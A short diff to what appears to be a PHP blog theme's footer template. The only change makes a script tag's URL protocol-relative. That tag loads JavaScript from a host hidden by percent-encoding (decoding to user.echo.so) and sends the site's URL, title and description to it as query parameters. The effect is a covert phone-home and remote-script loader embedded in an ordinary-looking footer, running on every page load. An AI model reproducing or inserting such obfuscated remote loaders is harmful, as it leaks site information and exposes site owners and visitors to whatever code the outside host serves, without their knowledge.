@@ -12,7 +12,7 @@
 
 <?php $this->footer(); ?>
 <?php if (!empty($this->options->isShow) && $this->options->isShow == 'checked'){$is_show = 1;}else{$is_show = 0;} ?>
-<script src="http://%75%73%65%72%2e%65%63%68%6f%2e%73%6f/log.so?domain=<?php $this->options->siteUrl(); ?>&title=<?php $this->options->title(); ?>&desc=<?php $this->options->description(); ?>&is_show=<?php echo $is_show; ?>"></script>
+<script src="//%75%73%65%72%2e%65%63%68%6f%2e%73%6f/log.so?domain=<?php $this->options->siteUrl(); ?>&title=<?php $this->options->title(); ?>&desc=<?php $this->options->description(); ?>&is_show=<?php echo $is_show; ?>"></script>
 <?php $this->options->script(); ?>
 </body>
 </html>
